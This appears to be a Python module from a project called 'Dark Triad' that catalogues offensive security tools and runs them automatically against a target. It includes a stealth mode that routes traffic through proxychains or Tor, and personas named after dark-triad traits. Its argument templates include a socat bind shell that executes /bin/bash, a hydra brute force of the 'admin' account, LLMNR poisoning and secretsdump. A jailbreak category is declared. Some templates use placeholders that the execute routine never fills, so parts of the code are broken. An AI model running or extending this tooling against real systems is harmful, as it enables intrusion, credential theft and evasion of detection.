"""Dark Triad — Unified Tool Manager.

Catalogue de TOUS les outils offensifs disponibles, avec :
- Détection automatique (which)
- Exécution sandboxée
- Fallback intelligent (si outil absent → alternative)
- Mode furtif (via StealthEngine)
"""

from __future__ import annotations

import asyncio
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import structlog

from navmax.dark_triad.stealth import StealthProfile, get_stealth_profile

logger = structlog.get_logger(__name__)


class ToolCategory(Enum):
    RECON = "recon"
    SCAN = "scan"
    EXPLOIT = "exploit"
    CVE = "cve"
    WEB = "web"
    FUZZ = "fuzz"
    CRACK = "crack"
    POST_EXPLOIT = "post_exploit"
    PRIVESC = "privesc"
    OSINT = "osint"
    CLOUD = "cloud"
    WIRELESS = "wireless"
    EVASION = "evasion"
    JAILBREAK = "jailbreak"


@dataclass
class OffensiveTool:
    name: str
    category: ToolCategory
    description: str
    binary: str = ""  # commande shell
    install_cmd: str = ""  # comment l'installer
    fallback: str = ""  # alternative si absent
    args_template: str = ""
    stealth_compatible: bool = True
    risk_level: float = 0.5  # 0.0 = safe, 1.0 = dangerous


# ── Catalogue ─────────────────────────────────────────────────────────────────

TOOLS_CATALOG: list[OffensiveTool] = [
    # ═══ RECON ═══
    OffensiveTool("nmap", ToolCategory.SCAN, "Network mapper", "nmap",
                  "apt install nmap", "nc -zv", "{target} -Pn -T4 -p {ports} --open"),
    OffensiveTool("masscan", ToolCategory.SCAN, "Fast port scanner", "masscan",
                  "apt install masscan", "nmap -T5", "{target} -p{ports} --rate=10000"),
    OffensiveTool("naabu", ToolCategory.SCAN, "Fast port scanner (Go)", "naabu",
                  "go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest", "nmap",
                  "-host {target} -p {ports}"),
    OffensiveTool("rustscan", ToolCategory.SCAN, "Ultra-fast Rust scanner", "rustscan",
                  "docker run -it --rm --name rustscan rustscan/rustscan:latest", "nmap",
                  "-a {target} -p {ports}"),

    # ═══ OSINT ═══
    OffensiveTool("subfinder", ToolCategory.OSINT, "Subdomain discovery", "subfinder",
                  "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
                  "dig", "-d {domain} -silent"),
    OffensiveTool("amass", ToolCategory.OSINT, "Network mapping", "amass",
                  "go install github.com/owasp-amass/amass/v4/...@master", "subfinder",
                  "enum -d {domain}"),
    OffensiveTool("theHarvester", ToolCategory.OSINT, "Email/subdomain harvester", "theHarvester",
                  "apt install theharvester", "subfinder",
                  "-d {domain} -b all"),

    # ═══ CVE ═══
    OffensiveTool("nuclei", ToolCategory.CVE, "Vulnerability scanner (10k+ templates)", "nuclei",
                  "go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
                  "curl -s", "-u {target} -t http/exposures/ -silent", True, 0.3),
    OffensiveTool("searchsploit", ToolCategory.CVE, "Exploit-DB search", "searchsploit",
                  "apt install exploitdb", "curl https://cve.circl.lu/",
                  "{service} {version}", True, 0.1),

    # ═══ WEB ═══
    OffensiveTool("ffuf", ToolCategory.FUZZ, "Fast web fuzzer", "ffuf",
                  "go install github.com/ffuf/ffuf/v2@latest", "gobuster",
                  "-u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt", False, 0.4),
    OffensiveTool("gobuster", ToolCategory.FUZZ, "Directory brute forcer", "gobuster",
                  "apt install gobuster", "ffuf",
                  "dir -u {target} -w /usr/share/wordlists/dirb/common.txt"),
    OffensiveTool("sqlmap", ToolCategory.EXPLOIT, "SQL injection tool", "sqlmap",
                  "apt install sqlmap", "manual SQLi",
                  "-u {target} --batch --random-agent", False, 0.7),
    OffensiveTool("nikto", ToolCategory.WEB, "Web server scanner", "nikto",
                  "apt install nikto", "nuclei",
                  "-h {target} -Tuning 123456789", False, 0.5),
    OffensiveTool("wpscan", ToolCategory.WEB, "WordPress scanner", "wpscan",
                  "apt install wpscan", "nuclei", "--url {target} --enumerate"),

    # ═══ CRACK ═══
    OffensiveTool("hydra", ToolCategory.CRACK, "Brute force login", "hydra",
                  "apt install hydra", "medusa",
                  "-l admin -P /usr/share/wordlists/rockyou.txt {target} {service}"),
    OffensiveTool("john", ToolCategory.CRACK, "Password cracker", "john",
                  "apt install john", "hashcat", "--wordlist=/usr/share/wordlists/rockyou.txt {hashfile}"),
    OffensiveTool("hashcat", ToolCategory.CRACK, "GPU password cracker", "hashcat",
                  "apt install hashcat", "john",
                  "-m 0 -a 0 {hashfile} /usr/share/wordlists/rockyou.txt"),

    # ═══ EXPLOIT ═══
    OffensiveTool("metasploit", ToolCategory.EXPLOIT, "Exploitation framework", "msfconsole",
                  "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall",
                  "searchsploit", "", False, 0.9),
    OffensiveTool("responder", ToolCategory.EXPLOIT, "LLMNR/NBT-NS/mDNS poisoner", "responder",
                  "apt install responder", "impacket-smbserver",
                  "-I eth0 -w -r -f", True, 0.8),
    OffensiveTool("impacket", ToolCategory.EXPLOIT, "Windows network protocols", "impacket-secretsdump",
                  "apt install impacket-scripts", "", "", False, 0.8),

    # ═══ POST-EXPLOIT ═══
    OffensiveTool("chisel", ToolCategory.POST_EXPLOIT, "TCP/UDP tunnel over HTTP", "chisel",
                  "go install github.com/jpillora/chisel@latest", "socat",
                  "client {target}:{port} R:socks", True, 0.6),
    OffensiveTool("socat", ToolCategory.POST_EXPLOIT, "Netcat on steroids", "socat",
                  "apt install socat", "nc", "TCP-LISTEN:{port},fork EXEC:/bin/bash"),
    OffensiveTool("ligolo-ng", ToolCategory.POST_EXPLOIT, "Advanced tunneling/pivoting", "ligolo-ng",
                  "go install github.com/nicocha30/ligolo-ng@latest", "chisel",
                  "", True, 0.7),

    # ═══ EVASION ═══
    OffensiveTool("proxychains", ToolCategory.EVASION, "Proxy chainer", "proxychains4",
                  "apt install proxychains4", "tsocks", "", True, 0.1),
    OffensiveTool("torify", ToolCategory.EVASION, "Tor wrapper", "torify",
                  "apt install tor", "proxychains", "", True, 0.1),
]


class ToolManager:
    """Gestionnaire unifié d'outils offensifs.

    - Détecte les outils disponibles
    - Exécute avec ou sans sandbox
    - Mode furtif via StealthProfile
    - Fallback automatique
    """

    def __init__(self, stealth=None):
        self._available: dict[str, bool] = {}
        self._cache_time: float = 0.0
        if stealth is None:
            from navmax.dark_triad.stealth import STEALTH_STANDARD
            self.stealth = STEALTH_STANDARD
        else:
            self.stealth = stealth

    async def detect_all(self) -> dict[str, bool]:
        """Détecte tous les outils disponibles."""
        if self._available and time.time() - self._cache_time < 300:
            return self._available

        loop = asyncio.get_event_loop()
        results = {}

        async def _detect(tool: OffensiveTool) -> tuple[str, bool]:
            exists = await loop.run_in_executor(
                None, lambda: shutil.which(tool.binary) is not None)
            return tool.name, exists

        tasks = [_detect(t) for t in TOOLS_CATALOG]
        all_results = await asyncio.gather(*tasks)
        for name, exists in all_results:
            results[name] = exists

        self._available = results
        self._cache_time = time.time()
        return results

    def get_tool(self, name: str) -> OffensiveTool | None:
        """Retourne un outil par nom."""
        for t in TOOLS_CATALOG:
            if t.name == name:
                return t
        return None

    def get_by_category(self, category: ToolCategory) -> list[OffensiveTool]:
        """Retourne tous les outils d'une catégorie."""
        return [t for t in TOOLS_CATALOG if t.category == category]

    async def execute(self, tool_name: str, target: str,
                       args: str = "", timeout_s: int = 60) -> dict[str, Any]:
        """Exécute un outil avec gestion de fallback."""
        tool = self.get_tool(tool_name)
        if not tool:
            return {"success": False, "error": f"Tool '{tool_name}' not in catalog"}

        start = time.monotonic()
        available = self._available.get(tool_name, False)

        # Fallback si l'outil n'est pas disponible
        cmd_binary = tool.binary if available else (tool.fallback.split()[0] if tool.fallback else "")
        if not cmd_binary or not shutil.which(cmd_binary):
            return {"success": False, "error": f"Tool '{tool_name}' and fallback not available",
                    "install": tool.install_cmd}

        # Appliquer la furtivité
        if tool.stealth_compatible and self.stealth:
            await asyncio.sleep(self.stealth.delay_min)

        # Construire la commande
        cmd_str = f"{cmd_binary} {tool.args_template.format(target=target, ports=args or '80,443')} {args}"
        if self.stealth and self.stealth.use_proxy:
            cmd_str = f"proxychains4 -q {cmd_str}"

        try:
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(
                None,
                lambda: subprocess.run(
                    cmd_str.split(), capture_output=True, text=True,
                    timeout=timeout_s))
            return {
                "success": result.returncode == 0,
                "tool": tool_name,
                "fallback_used": not available and bool(tool.fallback),
                "output": (result.stdout or result.stderr)[:1000],
                "duration_ms": (time.monotonic() - start) * 1000,
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "tool": tool_name, "error": "timeout"}
        except Exception as e:
            return {"success": False, "tool": tool_name, "error": str(e)}

    async def run_category(self, category: ToolCategory, target: str,
                            persona: str = "mach") -> list[dict[str, Any]]:
        """Exécute tous les outils d'une catégorie."""
        tools = self.get_by_category(category)
        results = []
        max_parallel = {"mach": 3, "narcissism": 5, "psychopathy": 10}.get(persona, 3)
        sem = asyncio.Semaphore(max_parallel)

        async def _run_one(tool: OffensiveTool):
            async with sem:
                return await self.execute(tool.name, target)

        tasks = [_run_one(t) for t in tools]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if isinstance(r, dict)]
